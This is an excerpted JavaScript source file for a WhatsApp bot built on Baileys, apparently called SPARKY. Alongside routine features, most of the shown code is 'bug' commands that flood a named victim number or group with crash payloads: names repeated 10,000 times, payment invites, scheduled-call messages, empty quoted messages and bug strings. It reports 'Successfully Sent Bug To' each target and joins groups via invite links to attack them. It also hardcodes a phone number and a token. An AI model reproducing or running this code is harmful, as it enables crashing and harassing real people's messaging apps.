...
//bug database
const { xeontext1 } = require('./lib/bugs/xeontext1')
const { xeontext2 } = require('./lib/bugs/xeontext2')
const { xeontext3 } = require('./lib/bugs/xeontext3')
const { xeontext4 } = require('./lib/bugs/xeontext4')
const { xeontext5 } = require('./lib/bugs/xeontext5')
const { xeontext6 } = require('./lib/bugs/xeontext6')
const wkwk = fs.readFileSync(`./lib/bugs/x.mp3`)
const xsteek = "https://i.imgur.com/r3GZeiX.jpeg"

//database
let premium = "917012984396"
...
module.exports = SPARKY = async (SPARKY, m, msg, chatUpdate, store) => {
    try {
        const {
            type,
            quotedMsg,
...
"previewType": "PHOTO",
"thumbnailUrl": ``,
"thumbnail": "https://i.imgur.com/r3GZeiX.jpeg",
"sourceUrl": `${link}`}}},
{ quoted: m})
}
...
SPARKY.sendMessage(from, { text: texto, mentions: [sender]}, {quoted: m }).catch(e => {
return reply("Erro..")
})
}
...
let { key } = await SPARKY.sendMessage(from, {text: 'ʟᴏᴀᴅɪɴɢ...'})

for (let i = 0; i < xeonlod.length; i++) {
await SPARKY.sendMessage(from, {text: xeonlod[i], edit: key });
}
}
        ...
        if (autoread) {
            SPARKY.readMessages([m.key])
        }
        
        if (global.autoTyping) {
        SPARKY.sendPresenceUpdate('composing', from)
        }

        if (global.autoRecording) {
        SPARKY.sendPresenceUpdate('recording', from)
        }

        
        //bot number online status, available=online, unavailable=offline
        SPARKY.sendPresenceUpdate('uavailable', from)
        
        if (global.autorecordtype) {
        let xeonrecordin = ['recording','composing']
        let xeonrecordinfinal = xeonrecordin[Math.floor(Math.random() * xeonrecordin.length)]
        SPARKY.sendPresenceUpdate(xeonrecordinfinal, from)

        }
        
        if (autobio) {
            SPARKY.updateProfileStatus(`24/7 Online Bot By ${ownername}`).catch(_ => _)
        }
        if (m.sender.startsWith('92') && global.anti92 === true) {
            return SPARKY.updateBlockStatus(m.sender, 'block')
        }
        let list = []
        for (let i of owner) {
	}
	...
	//chat counter (console log)
        ...
        switch (command) {
            ...
            case 'ping':{
                ...
                respon = `${oldd - neww} _ms_`.trim()
                await SPARKY.sendMessage(m.chat, {
                    text: respon
                }, {
                    quoted: m
                })
...
await SPARKY.sendMessage(m.chat, { text: 'Success In Sending Bug', contextInfo:{ isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: '120363222395675670@newsletter', newsletterName: `${ownername}`.repeat(10000), serverMessageId: 2 } }}, { quoted: xbug2 })
await sleep(2000)
await SPARKY.sendMessage(m.chat, { react: { text: '🦄', key: { remoteJid: m.chat, fromMe: true, id: quoted.id } } })
}
break
case 'x2': {
if (!isPremium) return replygcxeon(mess.prem)
...
await SPARKY.sendMessage(m.chat, { text: ownername, contextInfo:{ isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: '120363222395675670@newsletter', newsletterName: botname.repeat(10000), serverMessageId: 2 } }}, { quoted: xbug2 })
}
}
break
case 'x': {
...
for (let i = 0; i < amount; i++) {
await SPARKY.sendMessage(victim, { text: ownername, contextInfo:{ isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: '120363222395675670@newsletter', newsletterName: botname.repeat(10000), serverMessageId: 2 } }}, { quoted: xbug2 })
}
...
amount = text * 30
for (let i = 0; i < amount; i++) {
await SPARKY.relayMessage(m.chat, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{})
await sleep(1400)
}
}
break
...
amount = text.split("|")[1] * 30
for (let i = 0; i < amount; i++) {
await SPARKY.relayMessage(victim, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{})
await sleep(1400)
}
replygcxeon(`Successfully Sent Bug To ${victim}`)
}
...
amount = text * 30
for (let i = 0; i < amount; i++) {
await SPARKY.sendMessage(m.chat, { "caption": `${ownername}`, audio: wkwk, mimetype: 'audio/mpeg', ptt:false,"title":`p`,"contextInfo": {"forwardingScore": 99999999,"isForwarded": true,forwardedNewsletterMessageInfo: { newsletterJid: '120363144038483540@newsletter', newsletterName: botname.repeat(10000),serverMessageId: 2 }}},{quoted: xbug2 })
}
}
break
case 'xaudio': {
...
amount = text.split("|")[1] * 30
for (let i = 0; i < amount; i++) {
await SPARKY.sendMessage(victim, { "caption": `${ownername}`, audio: wkwk, mimetype: 'audio/mpeg', ptt:false,"title":`p`,"contextInfo": {"forwardingScore": 99999999,"isForwarded": true,forwardedNewsletterMessageInfo: { newsletterJid: '120363144038483540@newsletter', newsletterName: botname.repeat(10000),serverMessageId: 2 }}},{quoted: xbug2 })
}
replygcxeon(`Successfully Sent Bug To ${victim}`)
}
break
...
amount = text.split("|")[1] * 30
for (let i = 0; i < amount; i++) {
await SPARKY.sendVideoAsSticker(victim, xsteek, xbug2, { packname: packname, author: author })
}
replygcxeon(`Successfully Sent Bug To ${victim}`)
}
break
...
amount = text * 2
for (let i = 0; i < amount; i++) {
await SPARKY.sendVideoAsSticker(m.chat, xsteek, xbug2, { packname: packname, author: author })
}
}
break
case 'xloc2': {
...
for (let i = 0; i < amount; i++) {
SPARKY.sendMessage(from, { location: { degreesLatitude: 173.282, degreesLongitude: -19.378, name: botname, address: ownername, url: `https://${XeonOP}.com`, comment: botname, jpegThumbnail: null } }, { quoted: xbug2 })
}
}
break
case 'xloc': {
...
XeonOP = ownername.repeat(0)
for (let i = 0; i < amount; i++) {
SPARKY.sendMessage(victim, { location: { degreesLatitude: 173.282, degreesLongitude: -19.378, name: botname, address: ownername, url: `https://${XeonOP}.com`, comment: botname, jpegThumbnail: null } }, { quoted: xbug2 })
}
replygcxeon(`Successfully Sent Bug To ${victim}`)
}
break
...
amount = text.split("|")[1] * 30
for (let i = 0; i < amount; i++) {
await SPARKY.sendMessage(victim, { text: '' }, { quoted: xbug2 })
}
replygcxeon(`Successfully Sent Bug To ${victim}`)
}
break
...
amount = text * 30
for (let i = 0; i < amount; i++) {
await SPARKY.sendMessage(from, { text: '' }, { quoted: xbug2 })
}
}
break
case 'xkill2': {
...
SPARKY.relayMessage(from, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
replygcxeon(`*Successfully sent as many bugs as ${amount} Please pause for 3 minutes*`)
...
case 'pmbug' :{
 if (!isPremium) return replygcxeon(mess.prem)
 if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 917012984396`)
 await loading()
victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "30"
for (let i = 0; i < amount; i++) {
...
SPARKY.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
replygcxeon(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
...
"sellerJid": "917012984396@s.whatsapp.net",
"token": "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ=="
}
}), { userJid: from, quoted:m})
SPARKY.relayMessage(victim, order.message, { messageId: order.key.id })
}
replygcxeon(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
}
break
...
let xeongc = await SPARKY.groupAcceptInvite(result)
amount = "30"
for (let i = 0; i < amount; i++) {
const xeonybug1 = `${xeontext1}`
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
...
SPARKY.relayMessage(xeongc, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
...
SPARKY.relayMessage(xeongc, order.message, { messageId: order.key.id })
}
replygcxeon(`*Successfully sent Bug To ${xeongc} Please pause for 3 minutes*`)
}
break
...
iosq <number>`
                SPARKY.sendMessage(m.chat, {
                        ...
                        contextInfo: {
                            externalAdReply: {
                                title: botname,
                                body: ownername,
                                thumbnailUrl: 'https://i.imgur.com/r3GZeiX.jpeg',
                                sourceUrl: link,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
        ...
        SPARKY.sendText(ownernumber + '@s.whatsapp.net', util.format(err), m)
